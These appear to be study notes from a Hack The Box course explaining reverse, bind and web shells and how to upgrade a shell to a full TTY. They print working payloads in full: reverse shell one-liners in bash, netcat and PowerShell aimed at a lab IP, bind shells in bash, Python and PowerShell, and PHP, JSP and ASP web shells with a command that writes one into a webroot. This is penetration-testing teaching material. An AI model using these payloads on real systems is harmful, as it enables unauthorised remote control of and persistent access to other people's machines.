### Uses of Shells
- When we have a system compromised and exploited the vulnerability, we need a method of communication with that system so we don't have to constantly redo that process.
- One way is using network protocols like SSH on Linux or WinRM on Windows, where we can remote login to the target.
- However, unless we have the correct credentials, these methods may not always be the best.
- This is where shells come in, we can use them to establish this communication instead.
![[Screenshot_20241107_124345.png]]


### Reverse Shell
- `Reverse Shells` are the most common, as they are the quickest, easiest method to get control of a target.
- They are created by having a `netcat` listener on our machine that listens on a specific port.
- With the listener established, we can execute a `reverse shell command` that gives us this connection.


### Netcat Listener
- The first step is to start a `netcat` listener on a port of our choosing:
```
secmancer@htb[/htb]$ nc -lvnp 1234

listening on [any] 1234 ...
```
- The flags we are using are the following:
![[Screenshot_20241107_124435.png]]
- Now that we have a `netcat` listener waiting for a connection, we can execute the reverse shell command that connects to us.
- #### Connect Back IP
	- First, let's find our system IP address to send a reverse connection back to us
```
secmancer@htb[/htb]$ ip a

...SNIP...

3: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 500
    link/none
    inet 10.10.10.10/23 scope global tun0
...SNIP...
```
- In this specific example, the IP we are interested in is under `tun0`, which is the same HTB network we connected to through our VPN.

> Note: We are connecting to the IP in 'tun0' because we can only connect to HackTheBox boxes through the VPN connection, as they do not have internet connection, and therefore cannot connect to us over the internet using `eth0`. In a real pentest, you may be directly connected to the same network, or performing an external penetration test, so you may connect through the `eth0` adapter or similar.

- #### Reverse Shell Command
	- The command depends on our operating system, and what applications/commands we can access.
	-  [Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) has a great, comprehensive list of reverse shell commands we can possibly use.
	- Some commands are more reliable than others, so keep that in mind.
	- We can use these more reliable commands to get a reverse connection:
```
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
```
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
```
```
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```
- We can use our exploit to execute one of the commands to get a reverse connection.
- Once done, we should get a connection from our netcat listener:
```
secmancer@htb[/htb]$ nc -lvnp 1234

listening on [any] 1234 ...
connect to [10.10.10.10] from (UNKNOWN) [10.10.10.1] 41572

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
- A reverse shell allows commands to be executed on a compromised host, with output returned directly to the attacker's machine.
- It provides a quick and reliable connection to the target system.
- Reverse shells are fragile; losing the connection or stopping the command requires re-exploitation to regain access.


### Bind Shell
-  `Bind Shell` is another type we can use.
	- Unlike a `Reverse Shell`, we have to connect to it on the `targets'` listening port.
- Once the `Bind Shell Command` runs, it will start listening on the port on the remote host and bind that host's shell to that port.
- We have to connect to it with netcat to get control through a shell on that system.
- [Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Bind%20Shell%20Cheatsheet.md) also have great commands for this type of shell as well!

> Note: we will start a listening connection on port '1234' on the remote host, with IP '0.0.0.0' so that we can connect to it from anywhere.

- Using reliable commands, we can do the following below:
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
```
```
python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
```
```
powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
```
- Once executed, we should have a shell waiting on the specified port.
- We can use `netcat` to connect to that port and get a connection to the shell:
```
secmancer@htb[/htb]$ nc 10.10.10.1 1234

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
- A bind shell allows direct interaction with the target system, and connections can be re-established as long as the bind shell remains active.
- If the bind shell command stops or the target system reboots, access is lost, requiring re-exploitation.
- The default shell lacks features like cursor movement, command editing, and access to command history.
- Upgrading to a full TTY enables enhanced functionality. This can be achieved using methods like the `python/stty` approach in the Netcat shell.
```
secmancer@htb[/htb]$ python -c 'import pty; pty.spawn("/bin/bash")'
```
- After running it, we can hit `ctrl+z` to background our shell to get back our local terminal.
- From there, we can input the following stty command:
```
www-data@remotehost$ ^Z

secmancer@htb[/htb]$ stty raw -echo
secmancer@htb[/htb]$ fg

[Enter]
[Enter]
www-data@remotehost$
```
- Use `fg` to bring the Netcat shell back, followed by pressing `Enter` or typing `reset` to restore functionality.
- After resetting, the shell supports command history and other standard features.
- To fix display issues, determine terminal size variables by maximizing another terminal window and running specific commands.
```
secmancer@htb[/htb]$ echo $TERM

xterm-256color
```
```
secmancer@htb[/htb]$ stty size

67 318
```

- First command gives us the `TERM` variable
- Second one shows us the values for `rows` and `columns`, respectively. 
- With our variables, we can go back to our `netcat` shell and use them to correct it:
```
www-data@remotehost$ export TERM=xterm-256color

www-data@remotehost$ stty rows 67 columns 318
```
- Now, we should have a `netcat` shell with full features to that of an SSH connection.


### Web Shell
- Final type is the `Web Shell`.
	- Typically a web script, like with PHP or ASPX, that allows us to enter commands through HTTP request parameters (GET, POST)
	- From there, it executes them and then prints the output of them back on the web page.
- First, the shell needs to be written so that our commands are turned into GET requests, executed, and displayed properly.
- Typically, they are one-liners that are easy to remember.
```
<?php system($_REQUEST["cmd"]); ?>
```
```
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```
```
<% eval request("cmd") %>
```
- The web shell script must be placed in the remote host's web directory (webroot) for execution via a web browser.
- Upload features can allow writing shell scripts like `shell.php` to the webroot, enabling access to execute commands.
- If remote command execution (RCE) is available, the shell can be directly written to the webroot for access.
- Determining the webroot is essential; default webroots vary depending on the web server in use.
![[Screenshot_20241107_124902.png]]
- We check the directories to see which webroot is in use.
- Then, we can use `echo` to write out our web shell.
```
echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
```
- Once our web shell is written, we can either access it through a browser or by using `cURL`. 
- We can visit the `shell.php` page on the compromised website, and use `?cmd=id` to execute the `id` command.
- We can also use cURL as well.
```
secmancer@htb[/htb]$ curl http://SERVER_IP:PORT/shell.php?cmd=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
- Web shells bypass firewall restrictions by operating on web application ports (e.g., `80` or `443`) and persist through host reboots, allowing continued access without re-exploitation.
- Web shells are less interactive than reverse or bind shells, requiring URL requests for each command.
- A Python script can automate URL requests, creating a semi-interactive web shell in the terminal.